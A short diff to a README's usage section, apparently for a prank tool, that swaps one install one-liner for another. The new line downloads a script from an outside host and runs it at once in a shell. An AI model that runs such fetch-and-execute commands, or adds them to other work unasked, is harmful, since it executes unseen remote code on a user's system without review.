@@ -16,7 +16,7 @@
 # Usage
 
 ```
-curl "http://tiny.cc/hasslehoff | /bin/sh"
+sh -c "$(wget -O- hth.i-m.cool)"
 ```
 
 # Files touched
